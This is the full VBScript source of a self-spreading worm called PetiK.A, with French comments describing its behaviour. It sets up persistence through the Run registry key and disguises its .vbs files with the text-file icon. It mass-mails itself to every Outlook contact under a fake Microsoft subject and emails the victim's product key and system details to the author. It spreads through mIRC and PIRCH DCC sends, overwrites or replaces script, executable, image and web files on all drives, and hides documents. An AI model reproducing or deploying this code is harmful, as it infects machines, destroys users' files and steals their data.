'Taille : 9766 octets
'Date : 30/01/2000
'Il se copie dans le dossier WINDIR sous le nom de PetiK.txt.vbs
'Pour cacher cela, il modifiera l'icône des .VBS en .TXT
'Il infecte ensuite mIRC. Il cherche le dossier par défaut où se trouve le fichier
'MIRC.INI. Si il le trouve, il crée à l'intérieur du dossier un fichier SCRIPT.INI
'Il infecte ensuite PIRCH de la même manière.
'Pour le logiciel Outlook, il va écrire son code à l'intérieur du message en VBScript
'De telle sorte que le virus s'active dès la lecture du message.
'Il envoie également différentes informations, à deux adresses : 
'petik@caramail.com et ppetik@hotmail.com. Les informations sont :
' - Nom de l'utilisateur et de l'Organisation
' - Le nom de l'ordinateur
' - Le pays
' - La version et le numéro de WINDOWS
' - Le numéro d'identification
' - Le numéro d'enregistrement
' - La page de démarrage d'Internet Explorer
' - Le dossier de téléchargement
' - Le nom de dossier de WINDOWS, SYSTEM, TEMPORAIRE et de PROGRAM FILES
' Et envoie tous cela avec comme sujet :
' Message pour PetiK de XXX où XXX est le nom d'Utilisateur
'Le message envoyé aux autres personnes est :
' " Important Message From Micrsoft Corporation "
'Il infecte ensuite les fichiers en fonction de leur extension.
' VBS et VBE : écrit le code du virus à l'intérieur.
' JS et JSE : écrit le code et change l'extension : file.js => file.vbs
' EXE, INI, GIF, JPG et HTM : créer un nouveau fichier .VBS avec code du virus
' MP3, DOC, XLS, PPT et HLP : met l'attribut caché
'
'VBS/Outlook/mIrc/PIRCH/PetiK.A par PetiK
Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
Set file     = fso.OpenTextFile(WScript.ScriptFullName,1)
vbscopie     = file.ReadAll

DEBUT()
Sub DEBUT()
On Error Resume Next
Set win  = fso.GetspecialFolder(0)
RUN      = ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK")
Set c    = fso.GetFile(WScript.ScriptFullName)
PetiK        = (win&"\PetiK.txt.vbs")
c.Copy   (PetiK)
ws.RegWrite RUN,PetiK
VBSI = ws.RegRead ("HKCR\VBSFile\DefaultIcon\")
TXTI = ws.RegRead ("HKCR\txtfile\DefaultIcon\")
ws.RegWrite "HKLM\Software\PetiK\ICONE VBS",VBSI
ws.RegWrite "HKCR\VBSFile\DefaultIcon\",TXTI
If ws.RegRead ("HKLM\Software\PetiK\") <> "OK" Then
EMail()
End If
If ws.RegRead ("HKLM\Software\PetiK\MIRC") <> "OK" then
Mirc ""
End If
If ws.RegRead ("HKLM\Software\PetiK\PIRCH") <> "OK" then
Pirch ""
End If
lecteur()
End Sub

Function EMail()
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While Myself.atendofstream = False
MyLine = Myself.readline
Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & Replace(MyLine, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
Myself.Close
htm = "<HTML><HEAD><META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><STYLE></STYLE></HEAD><BODY bgColor=#ffffff><SCRIPT language=vbscript>"
htm = htm & vbCrLf & "On Error Resume Next"
htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
htm = htm & vbCrLf & "If Err.Number <> 0 Then"
htm = htm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this EMail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
htm = htm & vbCrLf & "Else"
htm = htm & vbCrLf & "Set vbs = fso.CreateTextFile(fso.GetSpecialFolder(1) & " & Chr(34) & "\Worm.vbs" & Chr(34) & ", True)"
htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
htm = htm & vbCrLf & "vbs.Close"
htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
htm = htm & vbCrLf & "ws.run fso.GetSpecialFolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(1) & " & Chr(34) & "\Worm.vbs %" & Chr(34) & ""
htm2 = htm2 & vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
htm2 = htm2 & vbCrLf & "End If"
htm2 = htm2 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
HtmlBody = htm & htm2
Set mapi = Outlook.GetNameSpace("MAPI")
For Each Addresslist In mapi.AddressLists
If Addresslist.AddressEntries.Count <> 0 Then
AddCount = Addresslist.AddressEntries.Count
Set Msg = Outlook.CreateItem(0)
Msg.Subject = "Important Message From Microsoft Corporation"
Msg.HtmlBody = HtmlBody
Msg.DeleteAfterSubmit = True
For II = 1 To AddCount
Set Addentry = Addresslist.AddressEntries(II)
If AddCount = 1 Then
Msg.BCC = Addentry.Address
Else
Msg.BCC = Msg.BCC & "; " & Addentry.Address
End If
Next
Msg.send
End If
Next
Set msg2 = Outlook.CreateItem(0)
ComputerName = CreateObject("WScript.NetWork").ComputerName
NOM = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
ENT = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
VER = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\Version")
NUM = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
REC1 = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId")
REC2 = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey")
PFD = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
PDEM = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
DDIR = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
PAYS = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage")
WINDIR = fso.GetSpecialFolder(0)
SYSDIR = fso.GetSpecialFolder(1)
TMPDIR = fso.GetSpecialFolder(2)
msg2.BCC = "petik@caramail.com;ppetik@hotmail.com"
msg2.Subject = "Message pour PetiK de " & NOM
m2 = "-Information :"
m2 = m2 & vbCrLf & "Date : " & date
m2 = m2 & vbCrLf & "Heure : " & time
m2 = m2 & vbCrLf & "NOM DE L'ORDINATEUR : " & ComputerName
m2 = m2 & vbCrLf & "ENTREPRISE : " & ENT
m2 = m2 & vbCrLf & "PAYS : " & PAYS
m2 = m2 & vbCrLf & "SYSTEME D'EXPLOITATION : " & VER & " " & NUM
m2 = m2 & vbCrLf & "NUMERO D'IDENTIFICATION : " & REC1
m2 = m2 & vbCrLf & "NUMERO D'ENREGISTREMENT : " & REC2
m2 = m2 & vbCrLf & "PAGE DE DEMARRAGE : " & PDEM
m2 = m2 & vbCrLf & "DOSSIER DE TELECHARGEMENT : " & DDIR
m2 = m2 & vbCrLf & "DOSSIER WINDOWS : " & WINDIR
m2 = m2 & vbCrLf & "DOSSIER SYSTEME : " & SYSDIR
m2 = m2 & vbCrLf & "DOSSIER TEMPORAIRE : " & TMPDIR
m2 = m2 & vbCrLf & "DOSSIER PROGRAM FILES : " & PFD
msg2.Body = m2
msg2.DeleteAfterSubmit = True
msg2.Send
Outlook.Quit
End If
ws.RegWrite "HKLM\Software\PetiK\","OK"
End Function

Function Mirc(Path)
'On Error Resume Next
If Path = "" Then
If fso.FileExists("c:\mirc\mirc.ini") Then Path = "c:\mirc"
If fso.FileExists("c:\mirc32\mirc.ini") Then Path = "c:\mirc32"
PFD = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
PK2 = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK")
If fso.FileExists(PFD & "\mirc\mirc.ini") Then Path = PFD & "\mirc"
If fso.FileExists(PFD & "\mirc32\mirc.ini") Then Path = PFD & "\mirc"
End If
If Path <> "" Then
Set Script = fso.CreateTextFile(Path & "\script.ini", True)
Script.writeline "[script]"
Script.writeline "n0=on 1:JOIN:#:{"
Script.writeline "n1=  /if ( $nick == $me ) { halt }"
Script.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick " & PK2
Script.writeline "n3=}"
Script.Close
ws.RegWrite "HKLM\Software\PetiK\MIRC", "OK"
End If
End Function

Function Pirch(path)
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set ws = CreateObject("wscript.shell")
If path = "" Then
If fso.FileExists("c:\pirch\Pirch32.exe") Then path = "c:\pirch"
If fso.FileExists("c:\pirch32\Pirch32.exe") Then path = "c:\pirch32"
pfDir = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
PK3 = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK")
If fso.FileExists(pfDir & "\pirch\Pirch32.exe") Then path = pfDir & "\pirch\Pirch32.exe"
If fso.FileExists(pfDir & "\pirch32\Pirch32.exe") Then path = pfDir & "\pirch\Pirch32.exe"
End If
If path <> "" Then
Set Script = fso.CreateTextFile(path & "\events.ini", True)
Script.WriteLine "[Levels]"
Script.WriteLine "Enabled=1"
Script.WriteLine "Count=6"
Script.WriteLine "Level1=000-Unknowns"
Script.WriteLine "000-UnknownsEnabled=1"
Script.WriteLine "Level2=100-Level 100"
Script.WriteLine "100-Level 100Enabled=1"
Script.WriteLine "Level3=200-Level 200"
Script.WriteLine "200-Level 200Enabled=1"
Script.WriteLine "Level4=300-Level 300"
Script.WriteLine " 300-Level 300Enabled=1"
Script.WriteLine "Level5=400-Level 400 "
Script.WriteLine "400-Level 400Enabled=1"
Script.WriteLine "Level6=500-Level 500"
Script.WriteLine "500-Level 500Enabled=1"
Script.WriteLine ""
Script.WriteLine "[000-Unknowns]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[100-Level 100]"
Script.WriteLine "User1=*!*@*"
Script.WriteLine "UserCount=1"
Script.WriteLine "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & PK3
Script.WriteLine "EventCount=1"
Script.WriteLine ""
Script.WriteLine "[200-Level 200]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[300-Level 300]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[400-Level 400]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[500-Level 500]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.Close
End If
ws.RegWrite "HKLM\Software\PetiK\PIRCH", "OK"
End Function

Sub lecteur
On Error Resume Next
dim f,f1,fc
Set dr = fso.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
liste(d.path&"\")
End If
Next
End Sub

Sub infecte(dossier)
On Error Resume Next
Set f = fso.GetFolder(dossier)
Set fc = f.Files
For Each f1 in fc
ext = fso.GetExtensionName(f1.path)
ext = lcase(ext)
if (ext="vbs") or (ext="vbe")
Set ap=fso.OpenTextFile(f1.path,2,True)
ap.Write vbscopie
ap.Close
elseif (ext="js") or (ext="jse") Then
Set ap=fso.OpenTextFile(f1.path,2,True)
ap.Write vbscopie
ap.Close
bn=fso.GetBaseName(f1.path)
Set cop=fso.GetFile(f1.path)
cop.Copy(dossier&"\"&bn&".vbs")
fso.DeleteFile(f1.path)
elseif (ext="exe") or (ext="ini") or (ext="gif") or (ext="jpg") or (ext="htm") Then
Set cr = fso.CreateTextFile(f1.path&".vbs")
cr.Write vbscopie
cr.Close
fso.DeleteFile(f1.path)
elseif (ext="mp3") or (ext="doc") or (ext="xls") or (ext="ppt") or (ext="hlp") Then
Set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
End If
Next
End Sub

Sub liste(dossier)
On Error Resume Next
Set f = fso.GetFolder(dossier)
Set sf = f.SubFolders
For Each f1 in sf
infecte(f1.path)
liste(f1.path)
Next
End Sub
